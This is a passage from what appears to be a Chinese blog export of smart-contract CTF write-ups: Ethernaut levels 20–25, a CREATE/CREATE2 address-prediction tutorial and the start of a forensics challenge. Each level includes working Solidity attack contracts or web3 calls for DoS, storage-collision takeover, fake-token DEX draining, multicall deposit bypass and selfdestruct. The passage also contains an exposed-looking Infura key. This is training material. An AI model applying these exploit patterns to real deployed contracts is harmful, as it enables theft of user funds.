target.make_contact();\n        target.retract();\n        uint i = 2**256 - 1 - uint(keccak256(abi.encodePacked(uint(1)))) +1;\n        target.revise(i, payload);\n    &#125;\n&#125;\n\n\n此时codex.length为2**256-1，map[x]的存储地址为keccak256(slot(codex)),此处slot(map)为1，map[x]存储地址为keccak256(slot(codex))+x,所以构造x为 2^256-keccak256(1)，payload为任意地址即可覆盖Ownable-05.sol中的owner变量（owner和contact都存储在slot0）\n20.Denial\n\n\n\n\n\n\n\n\n题目要求：This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.\nIf you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.\nCodepragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Denial &#123;\n\n    using SafeMath for uint256;\n    address public partner; // withdrawal partner - pay the gas, split the withdraw\n    address payable public constant owner = address(0xA9E);\n    uint timeLastWithdrawn;\n    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances\n\n    function setWithdrawPartner(address _partner) public &#123;\n        partner = _partner;\n    &#125;\n\n    // withdraw 1% to recipient and 1% to owner\n    function withdraw() public &#123;\n        uint amountToSend = address(this).balance.div(100);\n        // perform a call without checking return\n        // The recipient can revert, the owner will still get their share\n        partner.call&#123;value:amountToSend&#125;(\"\");\n        owner.transfer(amountToSend);\n        // keep track of last withdrawal time\n        timeLastWithdrawn = now;\n        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);\n    &#125;\n\n    // allow deposit of funds\n    receive() external payable &#123;&#125;\n\n    // convenience function\n    function contractBalance() public view returns (uint) &#123;\n        return address(this).balance;\n    &#125;\n&#125;\n\nAnalyze题目在withdraw函数中使用了call转账的方式，向partner进行转账，并且partner地址可控，所以很显然这道题的重点在于攻击合约的fallback()函数构造。\n而题目要求推迟对owner的transfer，只需要让交易在call处耗尽gas即可\n从github的wp上摘录下来的。\n\n\n\n\n\n\n\n\n\n\n\nexpression\nsyntax\neffect\nOPCODE\n\n\n\nthrow\nif (condition) &#123; throw; &#125;\nreverts all state changes and deplete gas\nversion&lt;0.4.1: INVALID OPCODE - 0xfe, after: REVERT- 0xfd\ndeprecated in version 0.4.13 and removed in version 0.5.0\n\n\nassert\nassert(condition);\nreverts all state changes and depletes all gas\nINVALID OPCODE - 0xfe\n\n\n\nrevert\nif (condition) &#123; revert(value) &#125;\nreverts all state changes, allows returning a value, refunds remaining gas to caller\nREVERT - 0xfd\n\n\n\nrequire\nrequire(condition, &quot;comment&quot;)\nreverts all state changes, allows returning a value, refunds remaining gas to calle\nREVERT - 0xfd\n\n\n\nAttackpoc1：\npragma solidity ^0.6.0;\ncontract Denial&#123;\n     function setWithdrawPartner(address _partner) public&#123;&#125;\n     function withdraw() public&#123;&#125;\n&#125;\ncontract attack&#123;\n    Denial target=Denial(0x6Ae82f201182a50F89bed000Cf30CA72E2080c34);\n    function set() public &#123;\n        target.setWithdrawPartner(address(this));\n    &#125;\n    fallback() external payable&#123;\n      assert(false);\n    &#125;\n&#125;\n\n\n\npoc2：\ncontract Denial&#123;\n     function setWithdrawPartner(address _partner) public&#123;&#125;\n     function withdraw() public&#123;&#125;\n&#125;\ncontract attack2&#123;\n     Denial target=Denial(0x782682cf3433fF0F5223163A0120da1548f9Efe8);\n    function set() public &#123;\n        target.setWithdrawPartner(address(this));\n    &#125;\n    fallback() external payable&#123;\n        if(address(target).balance>0)\n        target.withdraw();\n    &#125;\n    function kill(address payable addr) public payable&#123;\n        selfdestruct(addr);\n    &#125;\n&#125;\n\n21.Shop\n\n\n\n\n\n\n\n\n题目要求：Сan you get the item from the shop for less than the price asked?\nThings that might help:\n\nShop expects to be used from a Buyer\nUnderstanding restrictions of view functions\n\nCodepragma solidity ^0.6.0;\n\ninterface Buyer &#123;\n  function price() external view returns (uint);\n&#125;\n\ncontract Shop &#123;\n  uint public price = 100;\n  bool public isSold;\n\n  function buy() public &#123;\n    Buyer _buyer = Buyer(msg.sender);\n\n    if (_buyer.price() >= price &amp;&amp; !isSold) &#123;\n      isSold = true;\n      price = _buyer.price();\n    &#125;\n  &#125;\n&#125;\n\nAnalyze两次调用了_buyer.price()，第一次大于100，第二次小于100即可\nAttackcontract Buyer&#123;\n     Shop target=Shop(0xB77306dcaD300299355F96a9c499082176523312);\nfunction price() public view  returns (uint)&#123;\n      if(target.isSold() == true)&#123;\n          return 1;\n      &#125;else&#123;\n          return 110;\n      &#125;\n  &#125;\n    function set() public&#123;\n        target.buy();\n    &#125;\n&#125;\n\n22.Dex\n\n\n\n\n\n\n\n\n题目要求：取光任一token\nCodepragma solidity ^0.6.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Dex  &#123;\n  using SafeMath for uint;\n  address public token1;\n  address public token2;\n  constructor(address _token1, address _token2) public &#123;\n    token1 = _token1;\n    token2 = _token2;\n  &#125;\n\n  function swap(address from, address to, uint amount) public &#123;\n    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), \"Invalid tokens\");\n    require(IERC20(from).balanceOf(msg.sender) >= amount, \"Not enough to swap\");\n    uint swap_amount = get_swap_price(from, to, amount);\n    IERC20(from).transferFrom(msg.sender, address(this), amount);\n    IERC20(to).approve(address(this), swap_amount);\n    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);\n  &#125;\n\n  function add_liquidity(address token_address, uint amount) public&#123;\n    IERC20(token_address).transferFrom(msg.sender, address(this), amount);\n  &#125;\n\n  function get_swap_price(address from, address to, uint amount) public view returns(uint)&#123;\n    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));\n  &#125;\n\n  function approve(address spender, uint amount) public &#123;\n    SwappableToken(token1).approve(spender, amount);\n    SwappableToken(token2).approve(spender, amount);\n  &#125;\n\n  function balanceOf(address token, address account) public view returns (uint)&#123;\n    return IERC20(token).balanceOf(account);\n  &#125;\n&#125;\n\ncontract SwappableToken is ERC20 &#123;\n  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) &#123;\n        _mint(msg.sender, initialSupply);\n  &#125;\n&#125;\n\nAnalyze这关没什么难度，只是比较繁琐，部署合约时候给了一定数量的token，换来换去知道取走所有即可\n23.Dex Two\n\n\n\n\n\n\n\n\n题目要求：As we’ve repeatedly seen, interaction between contracts can be a source of unexpected behavior.\nJust because a contract claims to implement the ERC20 spec does not mean it’s trust worthy.\nSome tokens deviate from the ERC20 spec by not returning a boolean value from their transfer methods. See Missing return value bug - At least 130 tokens affected.\nOther ERC20 tokens, especially those designed by adversaries could behave more maliciously.\nIf you design a DEX where anyone could list their own tokens without the permission of a central authority, then the correctness of the DEX could depend on the interaction of the DEX contract and the token contracts being traded.\nCodepragma solidity ^0.6.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract DexTwo  &#123;\n  using SafeMath for uint;\n  address public token1;\n  address public token2;\n  constructor(address _token1, address _token2) public &#123;\n    token1 = _token1;\n    token2 = _token2;\n  &#125;\n\n  function swap(address from, address to, uint amount) public &#123;\n    require(IERC20(from).balanceOf(msg.sender) >= amount, \"Not enough to swap\");\n    uint swap_amount = get_swap_amount(from, to, amount);\n    IERC20(from).transferFrom(msg.sender, address(this), amount);\n    IERC20(to).approve(address(this), swap_amount);\n    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);\n  &#125;\n\n  function add_liquidity(address token_address, uint amount) public&#123;\n    IERC20(token_address).transferFrom(msg.sender, address(this), amount);\n  &#125;\n\n  function get_swap_amount(address from, address to, uint amount) public view returns(uint)&#123;\n    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));\n  &#125;\n\n  function approve(address spender, uint amount) public &#123;\n    SwappableTokenTwo(token1).approve(spender, amount);\n    SwappableTokenTwo(token2).approve(spender, amount);\n  &#125;\n\n  function balanceOf(address token, address account) public view returns (uint)&#123;\n    return IERC20(token).balanceOf(account);\n  &#125;\n&#125;\n\ncontract SwappableTokenTwo is ERC20 &#123;\n  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) &#123;\n        _mint(msg.sender, initialSupply);\n  &#125;\n&#125;\n\nAnalyze不同于Dex那道题，这道题可以自己选择token进行交换，所以伴随了一个漏洞，token_address可控，所以我们可以写一个代币自行构造IERC20(from).balanceOf(address(this)的数值，可以直接取走另一token。\nAttackpragma solidity ^0.6.0;\ncontract DexTwo&#123;\n    function swap(address from, address to, uint amount)public&#123;&#125;\n     function add_liquidity(address token_address, uint amount)public&#123;\n          IERC20(token_address).transferFrom(msg.sender, address(this), amount);\n     &#125;\n&#125;\ncontract attack&#123;\n    mapping (address => uint) public _balanceOf;\n    mapping(address => mapping(address => uint256)) public _allowances;\n    address private owner;\n    DexTwo target=DexTwo(0xa651bC1624316539cE6142f0355021f44c64D7b6);\n    constructor() public&#123;\n        owner = msg.sender;\n        _balanceOf[address(this)]=1*10**18;\n        _balanceOf[owner]=1*10**18;\n    &#125;\n    function transferFrom(address sender,address receipent,uint amount) public returns (bool)&#123;\n        _balanceOf[sender]-=amount;\n        _balanceOf[receipent]+=amount;\n        return true;\n    &#125;\n    function balanceOf(address haver) public returns(uint)&#123;\n        return _balanceOf[haver];\n    &#125;\n    function add(address ed,uint amount) public&#123;\n        target.add_liquidity(ed,amount);\n    &#125;\n    function pwn(address from, address to, uint amount)public&#123;\n        target.swap(from,to,amount);\n    &#125;\n&#125;\ncontract IERC20 is attack&#123;&#125;\n\n使用该合约进行攻击，剩下的就是数学问题了\n24.Puzzle Wallet\n\n\n\n\n\n\n\n\n题目要求：\nNowadays, paying for DeFi operations is impossible, fact.\nA group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.\nThey needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.\nLittle did they know, their lunch money was at risk…\n You’ll need to hijack this wallet to become the admin of the proxy.\n Things that might help::\n\nUnderstanding how delegatecalls work and how msg.sender and msg.value behaves when performing one.\nKnowing about proxy patterns and the way they handle storage variables.\n\nCode// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\npragma experimental ABIEncoderV2;\n\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\nimport \"@openzeppelin/contracts/proxy/UpgradeableProxy.sol\";\n\ncontract PuzzleProxy is UpgradeableProxy &#123;\n    address public pendingAdmin;\n    address public admin;\n\n    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public &#123;\n        admin = _admin;\n    &#125;\n\n    modifier onlyAdmin &#123;\n      require(msg.sender == admin, \"Caller is not the admin\");\n      _;\n    &#125;\n\n    function proposeNewAdmin(address _newAdmin) external &#123;\n        pendingAdmin = _newAdmin;\n    &#125;\n\n    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;\n        require(pendingAdmin == _expectedAdmin, \"Expected new admin by the current admin is not the pending admin\");\n        admin = pendingAdmin;\n    &#125;\n\n    function upgradeTo(address _newImplementation) external onlyAdmin &#123;\n        _upgradeTo(_newImplementation);\n    &#125;\n&#125;\n\ncontract PuzzleWallet &#123;\n    using SafeMath for uint256;\n    address public owner;\n    uint256 public maxBalance;\n    mapping(address => bool) public whitelisted;\n    mapping(address => uint256) public balances;\n\n    function init(uint256 _maxBalance) public &#123;\n        require(maxBalance == 0, \"Already initialized\");\n        maxBalance = _maxBalance;\n        owner = msg.sender;\n    &#125;\n\n    modifier onlyWhitelisted &#123;\n        require(whitelisted[msg.sender], \"Not whitelisted\");\n        _;\n    &#125;\n\n    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;\n      require(address(this).balance == 0, \"Contract balance is not 0\");\n      maxBalance = _maxBalance;\n    &#125;\n\n    function addToWhitelist(address addr) external &#123;\n        require(msg.sender == owner, \"Not the owner\");\n        whitelisted[addr] = true;\n    &#125;\n\n    function deposit() external payable onlyWhitelisted &#123;\n      require(address(this).balance &lt;= maxBalance, \"Max balance reached\");\n      balances[msg.sender] = balances[msg.sender].add(msg.value);\n    &#125;\n\n    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;\n        require(balances[msg.sender] >= value, \"Insufficient balance\");\n        balances[msg.sender] = balances[msg.sender].sub(value);\n        (bool success, ) = to.call&#123; value: value &#125;(data);\n        require(success, \"Execution failed\");\n    &#125;\n\n    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;\n        bool depositCalled = false;\n        for (uint256 i = 0; i &lt; data.length; i++) &#123;\n            bytes memory _data = data[i];\n            bytes4 selector;\n            assembly &#123;\n                selector := mload(add(_data, 32))\n            &#125;\n            if (selector == this.deposit.selector) &#123;\n                require(!depositCalled, \"Deposit can only be called once\");\n                // Protect against reusing msg.value\n                depositCalled = true;\n            &#125;\n            (bool success, ) = address(this).delegatecall(data[i]);\n            require(success, \"Error while delegating call\");\n        &#125;\n    &#125;\n&#125;\n\nAnalyze这道题切入点就是UpgradeableProxy合约，现在已经更名为ERC1967Upgrade。这道题存在槽碰撞，pendingAdmin和owner时通过一个插槽，所以修改pendingAdmin直接就是修改了owner。可以了解一下ERC1967Upgrade来认识这一点。\n虽然合约中的proposeNewAdmin不可以直接调用，但是可以通过web3来发送交易\ndata&#x3D;selector+other\n运行之后owner变成了自己，再为自己添加白名单即可\n要劫持这个钱包就要成为admin，而现在可以改变admin的地方只有setMaxBalance，而这个函数要求合约余额为0，可以使合约余额减少的地方又只有execute()函数，这里只能去走存入的金额，合约将至少有0.001 ether，但是multicall使用了for循环调用，如果这里可以多次调用deposit那就可以随意增加自己的balances，但是显然这里限制了只能调用一次deposit()函数。\n此处看似严谨，但是如果我们可以将deposit()函数封装到零一个函数就可以绕过检测。所以构造data[deposit(),multicall(deposit())],这样既可绕过检测连续调用两次deposit，就可以达到用0.001 ether充值0.002 ether的效果取走合约的余额，调用setbalance()函数，参数为自己地址，即可劫持钱包。\nAttack获得owner\nweb3.eth.abi.encodeFunctionSignature(\"proposeNewAdmin(address)\");\nweb3.eth.abi.encodeParameter(\"address\", player);\n再拼接得到data\nawait web3.eth.sendTransaction(&#123;from: player, to: instance, data&#125;)\n\n增加balances\ndata1 = web3.eth.abi.encodeFunctionSignature(\"deposit()\");\n\ndata3=web3.eth.abi.encodeParameter('bytes[]', [data1]);\n\ndata2 = eb3.eth.abi.encodeFunctionSignature(\"multicall(bytes[])\");\n\ndata4=data2+data3\n\nawait contract.multicall([data1, data3], &#123; value: toWei('0.001') &#125;);\n\n获得admin\nawait contract.setMaxBalance('player')\n\n25.Motorbike\n\n\n\n\n\n\n\n\n题目要求：destory the engine of the motorbike\nCode// SPDX-License-Identifier: MIT\n\npragma solidity &lt;0.7.0;\n\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/proxy/Initializable.sol\";\n\ncontract Motorbike &#123;\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n    \n    struct AddressSlot &#123;\n        address value;\n    &#125;\n    \n    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.\n    constructor(address _logic) public &#123;\n        require(Address.isContract(_logic), \"ERC1967: new implementation is not a contract\");\n        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;\n        (bool success,) = _logic.delegatecall(\n            abi.encodeWithSignature(\"initialize()\")\n        );\n        require(success, \"Call failed\");\n    &#125;\n\n    // Delegates the current call to `implementation`.\n    function _delegate(address implementation) internal virtual &#123;\n        // solhint-disable-next-line no-inline-assembly\n        assembly &#123;\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)\n            returndatacopy(0, 0, returndatasize())\n            switch result\n            case 0 &#123; revert(0, returndatasize()) &#125;\n            default &#123; return(0, returndatasize()) &#125;\n        &#125;\n    &#125;\n\n    // Fallback function that delegates calls to the address returned by `_implementation()`. \n    // Will run if no other function in the contract matches the call data\n    fallback () external payable virtual &#123;\n        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);\n    &#125;\n\n    // Returns an `AddressSlot` with member `value` located at `slot`.\n    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;\n        assembly &#123;\n            r_slot := slot\n        &#125;\n    &#125;\n&#125;\n\ncontract Engine is Initializable &#123;\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    address public upgrader;\n    uint256 public horsePower;\n\n    struct AddressSlot &#123;\n        address value;\n    &#125;\n\n    function initialize() external initializer &#123;\n        horsePower = 1000;\n        upgrader = msg.sender;\n    &#125;\n\n    // Upgrade the implementation of the proxy to `newImplementation`\n    // subsequently execute the function call\n    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;\n        _authorizeUpgrade();\n        _upgradeToAndCall(newImplementation, data);\n    &#125;\n\n    // Restrict to upgrader role\n    function _authorizeUpgrade() internal view &#123;\n        require(msg.sender == upgrader, \"Can't upgrade\");\n    &#125;\n\n    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.\n    function _upgradeToAndCall(\n        address newImplementation,\n        bytes memory data\n    ) internal &#123;\n        // Initial upgrade and setup call\n        _setImplementation(newImplementation);\n        if (data.length > 0) &#123;\n            (bool success,) = newImplementation.delegatecall(data);\n            require(success, \"Call failed\");\n        &#125;\n    &#125;\n    \n    // Stores a new address in the EIP1967 implementation slot.\n    function _setImplementation(address newImplementation) private &#123;\n        require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n        \n        AddressSlot storage r;\n        assembly &#123;\n            r_slot := _IMPLEMENTATION_SLOT\n        &#125;\n        r.value = newImplementation;\n    &#125;\n&#125;\n\nAnalyze题目要求使用selfdestruct方法回调engine，尝试过在proxy中更新逻辑合约地址，但由于engine内的初始化函数在关卡创建时候已经被调用，upgrader变量不能再被更改，尝试了直接更改存储address的slot，但是逻辑合约中的一切可以修改对应参数的函数均被限制，modifer或internal以及private\n最终检查逻辑和月中初始化函数并没有被调用过，可以自行调用使逻辑合约的upgrader变成攻击合约，从而调用upgradeandcall函数，调用其中的selfdestruct函数毁掉引擎\nAttackcontract attack&#123;\n    address public tar=0xeEA18Bb1788a7C81488Cbd89A75C7e4DF86dBb89;\n    constructor()public&#123;\n        tar.call(abi.encodeWithSignature(\"initialize()\"));\n    &#125;\n    pwncon public pwnaddr=new pwncon();\n    bytes4 public selecet=pwnaddr.des.selector;\n    function upandcall(address a,bytes calldata data)public&#123;\n        tar.call(abi.encodeWithSignature(\"upgradeToAndCall(address,bytes)\",a,data));\n    &#125;\n&#125;\ncontract pwncon&#123;\n    function des()external payable&#123;\n        selfdestruct(payable(msg.sender));\n    &#125;\n&#125;\n\n","slug":"ethernaut","date":"2022-08-02T02:42:37.160Z","categories_index":"","tags_index":"区块链","author_index":"bcYng"},{"id":"e5737740b784095b2d07fd3a962c9c2b","title":"Understand create and create2 algorithms according to two challenges","content":"0x00 合约地址计算合约地址按照一定的规律计算而来，所以在合约部署之前即可计算出合约地址。\n 地址计算有两种方式\n \n\n\n\n\n\n\n\n\n\n\n\nCreate : Web3.sha3(rlp.encode(deployingAddress, nonce))[12:]\nCreate2 : Web3.keccak(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))[12:]\n\n[sha3和keccak256相同]\n0x01 create方法以太坊合约的地址是根据创建者（sender）的地址以及创建者发送过的交易数量（nonce）来计算确定的。 sender和nonce 进行RLP编码，然后用Keccak-256 进行hash计算。\n计算地址的python代码如下\nfrom web3 import Web3,HTTPProvider\nimport rlp\nw3=Web3(HTTPProvider('https://ropsten.infura.io/v3/071f682145af4cfc9f0b92a497e89431'))//以ropsten网络进行测试\n\ndef getnonce(addr):\n    return w3.eth.getTransactionCount(Web3.toChecksumAddress(hex(addr)))//此处地址使用十六进制\n    \ndef getaddress(sender,nonce):\n    return (Web3.sha3(rlp.encode([addr, nonce]))[12:].hex())//注意此处使用的是地址的十进制\n    //计算数据总共有64位，取后40位为地址\n\naddr=部署合约的msg.sender。如果是合约中部署的new合约，则为合约地址\nnonce=getnonce(addr)//获得交易数量nonce注意获得的nonce是下一次交易的nonce，并非本次\nprint(nonce)\n\ngetnextaddress=getaddress(addr,nonce)\nprint(getnextaddress)//得到下一个部署的合约的地址\n\n值得注意的是：根据EIP 161 规范合约帐户使用 nonce&#x3D;1 初始（在主网络上）。 因此，由一个合约创建的第一个合约地址将使用非零nonce进行计算。\n以下进行测试：\n测试一，使用metamask账户直接部署运行python文件获得如下内容\n\n即下一笔交易将是第294，并且下一个合约地址将是0x22a21fc272921b6de75320422e3ef44ad3a9fca3\n在remix编译器中部署一个新的合约，查看合约地址如下\n\n可以发现，合约地址和计算的地址是相同的。\n所部署合约源码（为测试二准备）\ncontract b &#123;\n\t//empty\n\t&#125;\ncontract a &#123;\n\t\n    b public target;\n\n    constructor(address _ctfLauncher, address _player) public payable\n    &#123;\n        target = new b();\n    &#125;\n    &#125;\n\n测试二，合约中部署新的合约计算方法和测试一中的方法一样，不过nonce处存在不同。\n根据EIP 161规定，由一个合约创建的第一个合约地址将使用非零nonce进行计算即nonce&#x3D;1。\n方便起见，直接计算测试一中的target地址\n\n合约在部署时候新建了new b合约，所以addr应为合约地址\n\n运行得到结果\n\n查看合约中创建的合约地址，可见计算正确\n\n0x02  create2方法CREATE2 不再依赖于账户的 nonce，而是对以下参数进行哈希计算，得出新的地址：\n\n合约创建者的地址（address)\n作为参数的混淆值（salt）\n合约创建代码 (init_code)\n\n参考EIP 1014\n具体的计算公式如下：\nWeb3.sha3(0xff ++ address ++ salt ++ keccak256(init_code))[12:]\n\n注意：①此处的++指的是字节的拼接而不是数字加减所以顺序不可打乱②address为执行deploy函数（见下文部署合约代码）的合约地址\n计算地址的python代码如下\ndeployingAddr='address without 0x'\ns=Web3.keccak(hexstr=code)\na=''.join(['%02x' % b for b in s])\nsalt=hex(i)[2:].rjust(64,'0')//i为随机数\np=Web3.keccak(hexstr=('0xff' + deployingAddr + salt + a))[12:].hex()\n\n计算地址的solidity代码如下\nfunction getAddress(address addr, bytes memory bytecode, uint salt) public view returns (address) &#123;\n    bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff),addr,salt,keccak256(bytecode)));\n    return address(uint160(uint256(hash)));\n&#125;\n\n使用salt进行指定地址的合约部署代码如下\ncontract Deployer &#123;\n    // contractBytecode是待部署合约的bytecode\n    address public a;\n    bytes code = hex\"your code\";\n    function deploy(uint salt) internal returns (address)&#123;\n        bytes memory bytecode = code;\n        address addr;\n      \n        assembly &#123;\n          addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)\n        &#125;\n        return addr;\n    &#125;\n    function get(uint salt)public &#123;\n        a=deploy(salt);\n    &#125;\n&#125;\n\n\n\n0x03  解题练习create练习题目地址：blockchain-ctf第十一题Rainy Day Fund\n题目代码\npragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\ncontract DebugAuthorizer&#123;\n    \n    bool public debugMode;\n\n    constructor() public payable&#123;\n        if(address(this).balance == 1.337 ether)&#123;\n            debugMode=true;\n        &#125;\n    &#125;\n&#125;\n\ncontract RainyDayFund is CtfFramework&#123;\n\n    address public developer;\n    mapping(address=>bool) public fundManagerEnabled;\n    DebugAuthorizer public debugAuthorizer;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        //debugAuthorizer = (new DebugAuthorizer).value(1.337 ether)(); // Debug mode only used during development\n        debugAuthorizer = new DebugAuthorizer();\n        developer = msg.sender;\n        fundManagerEnabled[msg.sender] = true;\n    &#125;\n    \n    modifier isManager() &#123;\n        require(fundManagerEnabled[msg.sender] || debugAuthorizer.debugMode() || msg.sender == developer, \"Unauthorized: Not a Fund Manager\");\n         _;\n    &#125;\n\n    function () external payable ctf&#123;\n        // Anyone can add to the fund    \n    &#125;\n    \n    function addFundManager(address _newManager) external isManager ctf&#123;\n        fundManagerEnabled[_newManager] = true;\n    &#125;\n\n    function removeFundManager(address _previousManager) external isManager ctf&#123;\n        fundManagerEnabled[_previousManager] = false;\n    &#125;\n\n    function withdraw() external isManager ctf&#123;\n        msg.sender.transfer(address(this).balance);\n    &#125;\n&#125;\n\n题目要求很简单就是要偷走题目中的所有合约，但是取走题目合约中的需要调用withdraw函数，该函数要求ismanager的要求，查看修饰内容，fundManagerEnabled[msg.sender]和msg.sender &#x3D;&#x3D; developer不能修改，唯一的入口是debugAuthorizer.debugMode()，而DebugAuthorizer中的判断只在构造时执行，所以必须要预测该合约地址。\n使用create计算方法根据developer和nonce计算合约地址，再根据合约地址和nonce计算new DebugAuthorizer()，转入1.337 ether即可\n\n\n在进行withdraw即可通关\ncreate2练习题目地址：capture the ether–Fuzzy identity\n题目代码\npragma solidity ^0.4.21;\n\ninterface IName &#123;\n    function name() external view returns (bytes32);\n&#125;\n\ncontract FuzzyIdentityChallenge &#123;\n    bool public isComplete;\n\n    function authenticate() public &#123;\n        require(isSmarx(msg.sender));\n        require(isBadCode(msg.sender));\n\n        isComplete = true;\n    &#125;\n\n    function isSmarx(address addr) internal view returns (bool) &#123;\n        return IName(addr).name() == bytes32(\"smarx\");\n    &#125;\n\n    function isBadCode(address _addr) internal pure returns (bool) &#123;\n        bytes20 addr = bytes20(_addr);\n        bytes20 id = hex\"000000000000000000000000000000000badc0de\";\n        bytes20 mask = hex\"000000000000000000000000000000000fffffff\";\n\n        for (uint256 i = 0; i &lt; 34; i++) &#123;\n            if (addr &amp; mask == id) &#123;\n                return true;\n            &#125;\n            mask &lt;&lt;= 4;\n            id &lt;&lt;= 4;\n        &#125;\n\n        return false;\n    &#125;\n&#125;\n\n题目要求使isComplete &#x3D; true，即使msg.sender合约中public存储变量name为bytes32(“smarx”)，并且合约地址中有badc0de字符\n使用create计算方法爆破salt获得含有指定字符的地址，爆破代码如下\nfrom web3 import Web3,HTTPProvider\n\ndeployingAddr='2bA2D4a1B728D87E9319ce51B3F5086a78f945d9'\n\ncode='60806040527f736d61727800000000000000000000000000000000000000000000000000000060005573553c7e7d4ba3f92d85c009cacb2b995d9e3c79b7600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561008957600080fd5b50610119806100996000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c806306fdde03146037578063dd365b8b146053575b600080fd5b603d605b565b6040518082815260200191505060405180910390f35b60596061565b005b60005481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663380c7a676040518163ffffffff1660e01b8152600401600060405180830381600087803b15801560ca57600080fd5b505af115801560dd573d6000803e3d6000fd5b5050505056fea2646970667358221220434aa07aa1939601b3982d4fefcf99b542f6bc06572ed87993a90d2ff7cf687c64736f6c63430006000033'\n\n//待部署合约的bytecode\n\ns=Web3.keccak(hexstr=code)\n\na=''.join(['%02x' % b for b in s])//将s转变为字节\n\ni=0\n\nwhile(1):\n    salt=hex(i)[2:].rjust(64,'0')\n    print(salt)\n    p=Web3.keccak(hexstr=('0xff' + deployingAddr + salt + a))[12:].hex()\n    if 'badc0de' in p:\n        print(salt,p)\n        break\n    i+=1\n\n\n使用爆破出的salt部署IName合约，再通过部署的合约调用题目中的authenticate()函数即可通关\n\n","slug":"Understand create and create2 algorithms according to two challenges","date":"2022-08-02T02:38:41.514Z","categories_index":"","tags_index":"区块链","author_index":"bcYng"},{"id":"6aeab2a5cd77c3106ff796f4ea68ab90","title":"Find abnormal transactions","content":"一道新颖的区块链安全方向ctf题目，交易详情：https://kovan.etherscan.io/address/0x16537776395108789FE5cC5420545CAb210a7D30\ncode\n\n\n\n\n\n\n\n\n题目描述：\nThe funds are lost somewhere on this platform. Find the missing funds from draftdown labs. We need it to fund our mission. Use our script to validate the transaction.Note: No brute force or fuzzing is needed for the search! Just use your eyes.Use CYBERLEAGUE{} flag format\nOur motherland have engaged a vendor to develop smart contract embedded in our fuel tank. We wanna make sure that the amount of fuel is recorded in an immutable blockchain. (In russian) Chert by pobral etikh idiotov! The smart contract is broken and our funds are stolen. Investigate and find out the culprite immediately! \\r\\nSmart contract link: https://kovan.etherscan.io/address/0x16537776395108789FE5cC5420545CAb210a7D30&quot;\npragma solidity ^0.8.0;\n\ninterface IERC20 &#123;\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n&#125;\n\nlibrary Address &#123;\n\n    function isContract(address account) internal view returns (bool) &#123;\n        return account.code.length > 0;\n    &#125;\n\n    function sendValue(address payable recipient, uint256 amount) internal &#123;\n        